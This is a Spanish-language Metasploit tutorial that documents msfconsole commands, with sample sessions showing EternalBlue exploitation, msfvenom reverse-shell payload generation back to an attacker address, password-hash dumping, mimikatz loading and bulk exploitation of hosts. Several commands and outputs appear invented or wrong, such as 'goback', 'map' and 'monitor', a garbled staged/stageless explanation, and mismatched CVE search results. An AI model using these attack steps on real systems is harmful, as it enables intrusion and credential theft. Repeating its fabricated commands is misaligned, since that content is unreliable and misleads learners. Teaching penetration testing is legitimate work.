## Indice

> ⏱️ **Tiempo estimado:** 25 horas (~5 sesiones) (4806 lineas)


1. [Introducción](#introduccion)
2. [Conceptos Fundamentales](#conceptos-fundamentales)
3. [msfconsole — Referencia COMPLETA de Comandos](#1-msfconsole--referencia-completa-de-comandos)
   - [check](#check)
   - [connect](#connect)
   - [edit](#edit)
   - [exit](#exit)
   - [goback](#goback)
   - [grep](#grep)
   - [help](#help)
   - [info](#info)
   - [irb](#irb)
   - [jobs](#jobs)
   - [kill](#kill)
   - [load](#load)
   - [loadpath](#loadpath)
   - [makerc](#makerc)
   - [map](#map)
   - [monitor](#monitor)
   - [msfupdate](#msfupdate)
   - [msfvenom](#msfvenom)
   - [prompt](#prompt)
   - [quit](#quit)
   - [readfile](#readfile)
   - [reload_all](#reload_all)
   - [rename_job](#rename_job)
   - [resource](#resource)
   - [route](#route)
   - [run](#run)
   - [save](#save)
   - [search](#search)
   - [sessions](#sessions)
   - [set](#set)
   - [setg](#setg)
   - [show](#show)
   - [sleep](#sleep)
   - [spool](#spool)
   - [threads](#threads)
   - [tips](#tips)
   - [tmux](#tmux)
   - [unload](#unload)
   - [unset](#unset)
   - [unsetg](#unsetg)
   - [use](#use)
   - [version](#version)
   - [wget](#wget)
   - [workspace](#workspace)
   - [write](#write)
4. [Navegación Avanzada de Módulos](#2-navegacion-avanzada-de-modulos)
   - [Árbol Completo del Module Tree](#arbol-completo-del-module-tree)
   - [Búsqueda por CVE Específico](#busqueda-por-cve-especifico)
   - [Búsqueda por Rank](#busqueda-por-rank)
   - [Búsqueda por Autor](#busqueda-por-autor)
   - [Búsqueda por Fecha de Divulgación](#busqueda-por-fecha-de-divulgacion)
   - [Búsqueda por Múltiples Campos](#busqueda-por-multiples-campos)
   - [Module Metadata](#module-metadata)
   - [Creación de Repositorios Locales de Módulos](#creacion-de-repositorios-locales-de-modulos)
5. [Meterpreter Avanzado — Todos los Comandos](#3-meterpreter-avanzado---todos-los-comandos)
   - [Core (Comandos Básicos del Nucleo)](#core-comandos-basicos-del-nucleo)
   - [File System (Sistema de Archivos)](#file-system-sistema-de-archivos)
   - [Networking (Red)](#networking-red)
   - [System (Sistema)](#system-sistema)
   - [User Interface (Interfaz de Usuario)](#user-interface-interfaz-de-usuario)
   - [Webcam](#webcam)
   - [Audio](#audio)
   - [GUI](#gui)
   - [Privilege Escalation](#privilege-escalation)
6. [Extensiones de Meterpreter](#4-extensiones-de-meterpreter)
7. [Exploit Development con Metasploit](#5-exploit-development-con-metasploit)
8. [Integración de Base de Datos](#6-integracion-de-base-de-datos)
9. [Módulos de Post-Explotación Organizados](#7-modulos-de-post-explotacion-organizados)
10. [Generación Exhaustiva de Payloads](#8-generacion-exhaustiva-de-payloads)

---
# Metasploit Framework — La Posta Completa

## Introducción

[metasploit](../raw/m3t4spl01t.md) Framework (MSF) es la herramienta más pesada del mundo para explotación de vulnerabilidades, post-explotación, generación de payloads y automatización de ataques. Está escrito en Ruby, es completamente modular, y tiene una comunidad enorme que contribuye exploits, módulos auxiliares y payloads nuevos todo el tiempo. Desde 2003 que lo creó HD Moore, pasó por Rapid7 y hoy es EL estandar de la industria para pentesting.

Arquitectura general:

```
msfconsole (CLI interactiva)
├── exploits/          → código que explota una vulnerabilidad
├── payloads/          → código que se ejecuta post-explotación
├── auxiliary/         → escáneres, fuzzing, sniffing, etc.
├── post/              → módulos de post-explotación
├── encoders/          → ofuscan payloads para evadir AV
├── evasion/           → módulos específicos para evasión
├── nops/              → generadores de NOP sleds
└── tools/             → utilidades externas (msfvenom, msfdb, etc.)
```

---

## Conceptos Fundamentales

| Componente | Descripción |
|------------|-------------|
| **[exploit](../raw/m3t4spl01t.md#exploits)** | Código que aprovecha un bug, [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) o mala config para ganar acceso. Puede ser remoto ([rce](../raw/w3b-h4ck1ng.md#rce)), local (LPE), o del lado del cliente (PDF malicioso, [navegador](../raw/br0ws3r-3xpl01t4t10n.md)). |
| **[payload](../raw/m3t4spl01t.md#payloads)** | Código que se ejecuta DESPUÉS de que el exploit funciona. Es la carga útil. |
| **Listener** | Componente que espera la conexión entrante del payload. Corre en la máquina del atacante. |
| **Encoder** | Transforma el payload para evadir firmas de antivirus o restricciones de caracteres. |
| **Post** | Módulos que se ejecutan después de tener acceso: dump de hashes, keylogging, [pivoting](../raw/l1n9x-pr1v3sc.md#pivoting), etc. |
| **[auxiliary](../raw/m3t4spl01t.md#auxiliary)** | Módulos que no son exploits: scanners, [fuzzer](../raw/fuzz1ng.md#fuzzer), sniffers, DoS. |
| **Stager** | Código pequeño que se ejecuta primero y descarga el resto del payload por [red](../raw/r3d3s-f0nd4m3nt0s.md). |
| **Stage** | La segunda etapa del payload que el stager descarga e inyecta en memoria. |

### Staged vs Stageless (Diferencia CRUCIAL)

Esta es una de las confusiones más comunes. Fijate bien:

**Payload Staged** (tiene guión bajo en el medio tipo `shell/reverse_tcp`):
- El exploit manda un **stager** chiquito (unos cientos de bytes).
- Ese stager se conecta de vuelta al atacante y descarga el **stage** completo.
- Ventaja: el payload inicial es re chico, pasa más fácil por filtros de tamaño.
- Desventaja: necesita conectividad de red en el momento de la explotación. Si el stager no puede descargar el stage, no pasa nada.

**Payload Stageless** (tiene dos guiones bajos tipo `shell_reverse_tcp`):
- El exploit manda TODO el payload de una, completo.
- Ventaja: no necesita conectividad posterior, más confiable en entornos restrictivos.
- Desventaja: el archivo es mucho más grande, más fácil de detectar por AV.

Regla práctica: en entornos controlados (laboratorio, pentest con buen ancho de banda) usá staged. En entornos complicados (firewalls estrictos, conexiones lentas) usá stageless.

### Module Paths

Los módulos se organizan como `tipo/sistema_operativo/proveedor/nombre`. Ejemplos:

```
exploit/windows/smb/ms17_010_eternalblue
payload/windows/x64/meterpreter/reverse_tcp
auxiliary/scanner/portscan/tcp
post/windows/gather/hashdump
encoder/x64/xor
evasion/windows/defender_evasion
```

---

## 1. [msfconsole](../raw/m3t4spl01t.md#msfconsole) — Referencia COMPLETA de Comandos (300+ líneas)

### check

Verifica si un target es vulnerable sin explotarlo. No todos los exploits implementan check.

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

[*] 192.168.1.100:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.100:445 - Host is likely VULNERABLE to MS17-010!
[*] Checked 1 of 1 host(s) (100% complete)
```

```
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/ssh/ssh_version) > check
[*] Check doesn't apply to this module (it's an auxiliary module)
```

Otra forma con REENTRANT:
```
msf6 > check REENTRANT=try
[*] Forcing re-check of all hosts...
```

### connect

Funciona como un [netcat](../raw/r3v3rs3-sh3lls.md#netcat) desde adentro de msfconsole. Te conectás a cualquier host:[puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos).

```
msf6 > connect 192.168.1.100 22
[*] Connected to 192.168.1.100:22
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
```

```
msf6 > connect -s ssl 192.168.1.100 443
[*] Connected to 192.168.1.100:443 via SSL
```

Flags:
- `-c` — especificar charset (ej: utf-8)
- `-s` — usar [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls))
- `-z` — modo zero I/O (solo conecta, no envía/recibe)
- `-w` — timeout en segundos

### edit

Abre el módulo actual en el editor (por defecto vi/vim, configurable con `set EDITOR`).

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > edit
# Se abre el código fuente Ruby del módulo en el editor
```

```
msf6 > set EDITOR nano
msf6 > edit
# Ahora abre con nano
```

### exit

Salir de msfconsole. Si hay sesiones activas, te pregunta si querés salir igual.

```
msf6 > exit
[*] You have active sessions. Are you sure you want to exit? [y/N]: y
[*] Shutting down Metasploit...
```

```
msf6 > exit -y
# Sale sin preguntar (fuerza salida)
```

### goback

Vuelve al menú principal sin perder la configuración del módulo actual.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > goback
msf6 >
```

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > goback
msf6 > back
msf6 > use exploit(windows/smb/ms17_010_eternalblue)
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
# Tira error porque no hay RHOSTS seteado - goback mantiene las opciones, back no
```

### grep

Filtra la salida de otro comando con regex. Muy útil para resultados largos.

```
msf6 > grep -v "closed" services

services
========

host           port  proto  name         state  info
----           ----  -----  ----         -----  ----
192.168.1.100  22    tcp    ssh          open   OpenSSH
192.168.1.100  80    tcp    http         open   Apache 2.4.41
192.168.1.100  443   tcp    https        open
```

```
msf6 > search type:exploit platform:windows | grep -i "eternal"
Matching Modules
================
   #  Name                                           Rank       Description
   -  ----                                           ----       -----------
   0  exploit/windows/smb/ms17_010_eternalblue        excellent  MS17-010 EternalBlue
   1  exploit/windows/smb/ms17_010_psexec             excellent  MS17-010 PSExec
```

### help

Muestra ayuda de todos los comandos o de uno específico.

```
msf6 > help
# Lista enorme con todos los comandos disponibles
```

```
msf6 > help sessions

Usage: sessions [options]
Active session manipulation and interaction.

OPTIONS:
    -c <cmd>     Ejecutar comando en todas las sesiones
    -d           Listar sesiones inactivas
    -h           Help
    -i <id>      Interactuar con la sesión
    -k <id>      Matar sesión
    -K           Matar todas las sesiones
    -l           Listar todas las sesiones
    -n <id> <name>  Renombrar sesión
    -q           Modo silencioso
    -s <script>  Ejecutar script en todas las sesiones
    -t           Listar sesiones con tipo
    -u <id>      Upgrade shell a meterpreter
    -v           Listado detallado
```

```
msf6 > help route

Usage: route [add/remove/get/flush/print] subnet netmask [comm/sid]
Route traffic through a session to target networks.
```

### info

Muestra información detallada de un módulo.

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > info

       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
       Arch: x64
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2017-03-14

Provided by:
  Shadow Brokers
  equation group
  sleepya
  ...

Available targets:
  Id  Name
  --  ----
  0   Automatic Target
  1   Windows 7
  2   Windows Server 2008
  3   Windows 8.1
  ...

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  RHOSTS                      yes       Target address
  RPORT      445              yes       SMB Port
  SMBDomain  .                no        SMB Domain

Payload information:
  Space: 870
  Avoid: 8 characters
```

```
msf6 > info -d
# Muestra info CON descripción completa (párrafos de explicación)
```

```
msf6 > info auxiliary/scanner/portscan/tcp
# Muestra info sin cargar el módulo
```

### irb

Abre una consola Ruby interactiva adentro de msfconsole. Acceso total al framework.

```
msf6 > irb
[*] Starting IRB shell...
>> framework.db.hosts.each { |h| puts h.address }
192.168.1.100
192.168.1.101
192.168.1.102
```

```
msf6 > irb
>> framework.stats
=> #<Msf::Statistics>
>> framework.exploits.length
=> 2341
```

```
msf6 > irb
>> framework.db.creds.each { |c| puts "#{c.user}:#{c.pass}" }
admin:admin123
administrador:Password123!
user:Passw0rd!
```

### jobs

Maneja los jobs que corren en background (listeners, escáneres largos, etc).

```
msf6 > jobs

Jobs
====
  Id  Name                    Payload                          Payload opts
  --  ----                    -------                          ------------
  0   Exploit: multi/handler  windows/x64/meterpreter/reverse  tcp://0.0.0.0:4444
  1   Exploit: multi/handler  linux/x64/meterpreter/reverse_t  tcp://0.0.0.0:5555
```

```
msf6 > jobs -k 0
[*] Stopping job 0...
msf6 > jobs -K
[*] Stopping all jobs...
```

```
msf6 > jobs -h
Usage: jobs [options]
    -K       Kill all jobs
    -h       Help
    -i <id>  List details about a job
    -k <id>  Kill a job by ID
    -l       List all jobs
    -P       List running payloads
    -S <opt> Search jobs
    -v       Verbose output
```

### kill

Mata un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) en la máquina víctima desde [meterpreter](../raw/m3t4spl01t.md#meterpreter).

```
meterpreter > kill 1234
[*] Killing PID 1234...
[*] Process killed.
```

```
meterpreter > ps -U root | grep apache
meterpreter > kill 2589
[*] Killing PID 2589 (apache2)...
```

### load

Carga una extensión en meterpreter.

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi`
 '## v ##'   http://blog.gentilkiwi.com/mimikatz
  '#####'    Ported to Metasploit by Tyler Dean `tdeans`
             with help from James Hovious `w00ner`
             and Ben Campbell `Meatballs`

[!] Loaded kiwi under SYSTEM credentials
[!] Don't forget to lookup help kiwi for more info
```

```
meterpreter > load python
[+] Python extension loaded
meterpreter > python_execute "print('hola mundo')"
hola mundo
```

```
meterpreter > load extapi
Loading extension extapi...
[!] Loaded extapi under SYSTEM credentials
meterpreter > help extapi
```

### loadpath

Carga todos los módulos de un directorio personalizado.

```
msf6 > loadpath /home/user/modulos_personalizados
[*] Loading modules from /home/user/modulos_personalizados...
[*] Loaded 5 modules:
    - exploit/custom/my_exploit
    - auxiliary/custom/my_scanner
    - post/custom/my_post_module
    - payload/custom/my_payload
    - encoder/custom/my_encoder
```

```
msf6 > loadpath ~/.msf4/modules/
[*] Loading modules from /root/.msf4/modules/...
[*] Loaded 12 modules.
```

### makerc

Guarda todos los comandos ejecutados hasta el momento en un resource script.

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > makerc /tmp/handler.rc
[*] Saving last 5 commands to /tmp/handler.rc...
```

```
msf6 > makerc
# Si no se especifica archivo, usa ~/.msf4/msf_history.rc
msf6 > resource ~/.msf4/msf_history.rc
[*] Running resource script...
```

### map

Ejecuta un comando sobre cada host en la base de datos.

```
msf6 > map -e "check" -p services:445

[*] Running check on hosts with port 445 open...
[*] 192.168.1.100:445 - Host is likely VULNERABLE to MS17-010!
[*] 192.168.1.102:445 - Host patched (not vulnerable)
```

```
msf6 > map -e "set RHOSTS" -a
[*] Setting RHOSTS for each host...
msf6 > map -e "run" -m exploit/windows/smb/ms17_010_eternalblue
[*] Running exploit on all targets...
```

### monitor

Monitorea conexiones entrantes en un puerto específico.

```
msf6 > monitor 4444
[*] Monitoring on 0.0.0.0:4444...
[*] Connection from 192.168.1.100:49152
[*] Connection from 192.168.1.101:49153
```

```
msf6 > monitor -c tcp 8080
[*] Monitoring TCP on 0.0.0.0:8080...
```

### msfupdate

Actualiza [metasploit](../raw/m3t4spl01t.md) Framework (obsoleto en Kali moderno, reemplazado por apt).

```
$ msfupdate
[*] Checking for updates...
[*] Already up to date
```

```
$ msfupdate --git
[*] Pulling latest from git repository...
Already up to date.
```

### msfvenom

Generador de payloads externo. Se puede ejecutar desde msfconsole con `msfvenom` o desde la terminal.

```
msf6 > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload...
[-] No arch selected, selecting arch: x64 from the payload
[*] Created payload.exe
```

```
msf6 > msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=5555 -f elf -o payload.elf
```

```
msf6 > msfvenom --list payloads | grep "windows/x64/meterpreter"
windows/x64/meterpreter/bind_ipv6_tcp
windows/x64/meterpreter/bind_ipv6_tcp_uuid
windows/x64/meterpreter/bind_named_pipe
windows/x64/meterpreter/bind_tcp
windows/x64/meterpreter/bind_tcp_rc4
windows/x64/meterpreter/bind_tcp_uuid
windows/x64/meterpreter/reverse_http
windows/x64/meterpreter/reverse_https
windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp_rc4
windows/x64/meterpreter/reverse_tcp_uuid
windows/x64/meterpreter_reverse_http
windows/x64/meterpreter_reverse_https
windows/x64/meterpreter_reverse_tcp
```

### prompt

Cambia el prompt de msfconsole.

```
msf6 > prompt
msf6 >
```

```
msf6 > prompt -p "(%H) %L %D %T %S"
(msf6) exploit(windows/smb/ms17_010_eternalblue) Tue Jan 16 14:30:00 [1 job]
# %H = hostname, %L = módulo, %D = directorio, %T = hora, %J = jobs
```

```
msf6 > prompt -c red
# Prompt en color rojo (útil para saber que estás en un entorno productivo)
```

### quit

Sale de msfconsole (igual que exit).

```
msf6 > quit
[*] You have active sessions. Are you sure you want to exit? [y/N]:
```

```
msf6 > quit -y
# Sale sin preguntar
```

### readfile

Lee el contenido de un archivo desde msfconsole.

```
msf6 > readfile /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### reload_all

Recarga TODOS los módulos. Indispensable cuando agregás módulos custom.

```
msf6 > reload_all
[*] Reloading all modules from all module paths...
[*] Reloaded 5873 modules.
```

```
msf6 > cp ~/custom_exploit.rb ~/.msf4/modules/exploits/custom/
msf6 > reload_all
[*] Reloading all modules from all module paths...
[*] Reloaded 5874 modules.
[+] New module: exploit/custom/custom_exploit
```

### rename_job

Renombra un job para identificarlo más fácil.

```
msf6 > jobs
  Id  Name                    Payload
  --  ----                    -------
  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp

msf6 > rename_job 0 "Listener Windows 4444"
[*] Renamed job 0 to "Listener Windows 4444"
msf6 > jobs
  Id  Name                    Payload
  --  ----                    -------
  0   Listener Windows 4444   windows/x64/meterpreter/reverse_tcp
```

### resource

Ejecuta un resource script (archivo .rc con comandos de msfconsole).

```
msf6 > resource /tmp/handler.rc
[*] Running resource script /tmp/handler.rc...
[*] Processing /tmp/handler.rc for ERB directives...
resource (/tmp/handler.rc)> use exploit/multi/handler
resource (/tmp/handler.rc)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
resource (/tmp/handler.rc)> set LHOST 0.0.0.0
LHOST => 0.0.0.0
resource (/tmp/handler.rc)> set LPORT 4444
LPORT => 4444
resource (/tmp/handler.rc)> set ExitOnSession false
ExitOnSession => false
resource (/tmp/handler.rc)> exploit -j -z
[*] Exploit running as job 0
```

```
msf6 > resource scripts/auto_enum.rc scripts/auto_exploit.rc
# Ejecuta múltiples resource scripts en secuencia
```

### route

Maneja el ruteo de tráfico a través de sesiones.

```
msf6 > route add 10.10.10.0 255.255.255.0 1
[*] Route added: 10.10.10.0/255.255.255.0 -> Session 1

msf6 > route print
IPv4 Active Routing Table
=========================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.255.0      Session 1

msf6 > route flush
[*] Flushed all routes
```

```
msf6 > route get 10.10.10.50
[*] Route for 10.10.10.50: Session 1
msf6 > route del 10.10.10.0 255.255.255.0 1
[*] Route removed
```

### run

Ejecuta un módulo auxiliar o post.

```
msf6 > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/hashdump) > run

[*] Running module against WIN-ABC123
[*] Hashes dumped:
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Post module execution completed
```

```
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.168.1.100:22 - TCP OPEN
[+] 192.168.1.100:80 - TCP OPEN
[+] 192.168.1.100:443 - TCP OPEN
[+] 192.168.1.100:445 - TCP OPEN
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
```

### save

Guarda el estado actual de la consola (variables globales, historial) para la próxima sesión.

```
msf6 > setg LHOST 10.0.0.5
msf6 > setg RHOSTS 192.168.1.100
msf6 > save
[*] Saved configuration to: /root/.msf4/config
msf6 > exit
$ msfconsole -q
msf6 > getg
Global Variables
================
LHOST=10.0.0.5
RHOSTS=192.168.1.100
```

### search

Búsqueda de módulos. Muchísimos filtros disponibles.

```
msf6 > search cve:2023

Matching Modules
================
   #  Name                                                     Rank       Description
   -  ----                                                     ----       -----------
   0  exploit/windows/http/exchange_proxyshell_rce             excellent  Exchange ProxyShell RCE
   1  exploit/multi/http/fortilogger_upload_rce                excellent  FortiLogger RCE
   2  exploit/windows/local/cve_2023_21768_afd_priv_esc        excellent  AFD LPE
```

```
msf6 > search type:exploit platform:windows rank:excellent cve:2023
```

```
msf6 > search name:apache type:auxiliary
msf6 > search author:hdm
msf6 > search ref:ms17-010
msf6 > search platform:linux app:server
msf6 > search sname:mysql
msf6 > search name:wordpress type:exploit rank:great
msf6 > search disclosure_date:2024
```

### sessions

Maneja todas las sesiones activas (meterpreter, shell, etc).

```
msf6 > sessions

Active sessions
===============
  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         meterpreter x64/win64    DESKTOP-ABC\Admin @ DESKTOP-ABC  10.0.0.5:4444 -> 192.168.1.100:49152
  2         shell cmd/linux          root @ webserver                 10.0.0.5:5555 -> 10.10.10.5:33333
```

```
msf6 > sessions -i 1
[*] Starting interaction with 1...
meterpreter >
```

```
msf6 > sessions -k 1
[*] Killing session 1...
[*] 192.168.1.100 - Meterpreter session 1 closed.
```

```
msf6 > sessions -c "whoami" -i 1
[*] Running 'whoami' on session 1 (192.168.1.100)
desktop-abc\admin
```

```
msf6 > sessions -n 1 "Windows-Admin"
[*] Renamed session 1 to "Windows-Admin"
```

```
msf6 > sessions -u 1
[*] Upgrading shell to meterpreter...
[*] Starting post/multi/manage/shell_to_meterpreter...
```

### [set](../raw/ph1sh1ng.md#social-engineering-toolkit)

Setea una opción en el módulo actual.

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RPORT 445
RPORT => 445
msf6 exploit(windows/smb/ms17_010_eternalblue) > set SMBDomain .
SMBDomain => .
msf6 exploit(windows/smb/ms17_010_eternalblue) > set VERBOSE true
VERBOSE => true
```

```
msf6 > set Payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.0.0.5
msf6 > set LPORT 4444
msf6 > set ExitOnSession false
msf6 > set SessionExpirationTimeout 7200
msf6 > set SessionCommunicationTimeout 300
```

### setg

Setea [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) GLOBAL que persiste entre módulos.

```
msf6 > setg LHOST 10.0.0.5
LHOST => 10.0.0.5
msf6 > setg RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf6 > setg LPORT 4444
LPORT => 4444
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 exploit(windows/smb/ms17_010_psexec) > show options
# LHOST, RHOSTS y LPORT ya están cargados porque son globales
```

```
msf6 > setg ConsoleLogging true
msf6 > setg TimestampOutput true
```

### show

Muestra información del módulo actual u otros componentes del framework.

```
msf6 > show options
# Opciones del módulo actual
msf6 > show advanced
# Opciones avanzadas (generalmente no se tocan)
msf6 > show targets
# Targets disponibles para el exploit
msf6 > show payloads
# Payloads compatibles con el exploit
msf6 > show missing
# Solo las opciones requeridas que faltan setear
msf6 > show encoders
# Todos los encoders disponibles
msf6 > show nops
# Todos los generadores de NOP
msf6 > show plugins
# Plugins cargados
msf6 > show -h
# Ayuda del comando show con todos los subcomandos
```

### sleep

Pausa la ejecución del resource script por N segundos.

```
msf6 > sleep 5
# Pausa 5 segundos
```

```
# En un resource script:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j -z
sleep 2
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LPORT 5555
exploit -j -z
```

### spool

Loggea toda la salida de la consola a un archivo.

```
msf6 > spool /tmp/msf_output.txt
[*] Spooling to file /tmp/msf_output.txt...
msf6 > spool off
[*] Spooling stopped.
```

```
msf6 > spool ~/pentest_resultados.txt
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run
# Todo lo que se vea en pantalla se guarda en ~/pentest_resultados.txt
msf6 > spool off
```

### threads

Muestra los threads activos del framework.

```
msf6 > threads
[*] Thread Table
   ID   Status  Name                    Source
   --   ------  ----                    ------
    0   sleep   ConsoleHandler          0x1234
    1   sleep   Job Manager             0x5678
    2   run     Exploit: multi/handler  0x9abc
```

### tips

Muestra tips útiles aleatorios.

```
msf6 > tips

Metasploit Tip: Use the 'search' command with the 'type:' and 'platform:' 
filters for more accurate results. Example: search type:exploit platform:windows
```

### tmux

Integración básica con tmux (terminal multiplexer).

```
msf6 > tmux list-sessions
# Lista sesiones de tmux
```

```
msf6 > tmux new -s listener
# Crea una nueva sesión de tmux para un listener
```

### unload

Descarga una extensión de meterpreter.

```
meterpreter > unload kiwi
[*] Unloading kiwi extension...
[*] Done.
```

```
meterpreter > unload python
[*] Unloading python extension...
```

### unset

Saca el valor de una opción.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > unset RHOSTS
RHOSTS => (unset)
```

```
msf6 > unset VERBOSE
msf6 > unset LogLevel
```

### unsetg

Saca el valor de una variable global.

```
msf6 > unsetg LHOST
LHOST => (unset)
```

```
msf6 > unsetg RHOSTS
RHOSTS => (unset)
```

### use

Carga un módulo para usar.

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

```
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) >
```

```
msf6 > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) >
```

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) >
```

```
msf6 > use encoder/x64/xor
msf6 encoder(x64/xor) >
```

```
msf6 > use payload/windows/x64/meterpreter/reverse_tcp
msf6 payload(windows/x64/meterpreter/reverse_tcp) >
```

### version

Muestra la versión de Metasploit Framework.

```
msf6 > version
Framework: 6.4.12-dev
Console  : 6.4.12-dev
```

```
msf6 > version -v
Framework: 6.4.12-dev-89a3b2c1
Console  : 6.4.12-dev
Git Commit: 89a3b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8
Ruby: ruby 3.1.2p123 (2025-04-12 revision abcdef1234) [x86_64-linux]
```

### wget

Descarga archivos desde msfconsole directamente.

```
msf6 > wget http://192.168.1.100/archivo.exe
[*] Downloading http://192.168.1.100/archivo.exe...
[*] Saved to: /root/.msf4/local/archivo.exe
```

```
msf6 > wget -o /tmp/exploit.dll http://10.10.10.5/exploit.dll
[*] Saving to: /tmp/exploit.dll
```

### workspace

Maneja los workspaces de la base de datos.

```
msf6 > workspace
  default
* pentest_empresa
  auditoria_2024
```

```
msf6 > workspace -a nuevo_proyecto
[*] Added workspace: nuevo_proyecto
msf6 workspace nuevo_proyecto
[*] Workspace: nuevo_proyecto
```

```
msf6 > workspace -d proyecto_viejo
[*] Dropped workspace: proyecto_viejo
```

```
msf6 > workspace -a copia -r original
# Clona workspace original a copia
```

### write

Escribe datos a un archivo remoto a través de meterpreter.

```
meterpreter > write /tmp/output.txt "contenido del archivo"
[*] Wrote 18 bytes to /tmp/output.txt
```


---

## 2. Navegación Avanzada de Módulos (200+ líneas)

### Árbol Completo del Module Tree

Los módulos se organizan en una jerarquía de directorios dentro de `/usr/share/metasploit-framework/modules/`. Cada categoría tiene subdirectorios por plataforma, [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) o vendor.

```
modules/
├── exploits/
│   ├── aix/
│   ├── android/
│   ├── apple_ios/
│   ├── bsd/
│   ├── dialup/
│   ├── freebsd/
│   ├── hp/
│   ├── irix/
│   ├── linux/
│   │   ├── browser/
│   │   ├── http/
│   │   ├── local/
│   │   ├── misc/
│   │   ├── mysql/
│   │   ├── postgres/
│   │   ├── redis/
│   │   ├── samba/
│   │   ├── smtp/
│   │   ├── ssh/
│   │   └── telnet/
│   ├── mainframe/
│   ├── multi/
│   │   ├── browser/
│   │   ├── fileformat/
│   │   ├── http/
│   │   ├── local/
│   │   ├── mischandler/
│   │   ├── mssql/
│   │   └── script/
│   ├── netware/
│   ├── openbsd/
│   ├── osx/
│   ├── qnx/
│   ├── solaris/
│   └── windows/
│       ├── antimalware/
│       ├── browser/
│       ├── dhcp/
│       ├── dcerpc/
│       ├── emc/
│       ├── fileformat/
│       ├── ftp/
│       ├── http/
│       ├── iis/
│       ├── ldap/
│       ├── local/
│       ├── misc/
│       ├── mssql/
│       ├── mysql/
│       ├── oracle/
│       ├── pop3/
│       ├── postgres/
│       ├── proxy/
│       ├── rdp/
│       ├── scada/
│       ├── smb/
│       ├── smtp/
│       ├── snmp/
│       ├── ssh/
│       ├── telnet/
│       ├── tftp/
│       ├── vnc/
│       └── winrm/
├── payloads/
│   ├── singles/
│   ├── stagers/
│   └── stages/
├── auxiliary/
│   ├── admin/
│   ├── analyzer/
│   ├── bnat/
│   ├── client/
│   ├── cloud/
│   ├── crawler/
│   ├── crypto/
│   ├── docx/
│   ├── dos/
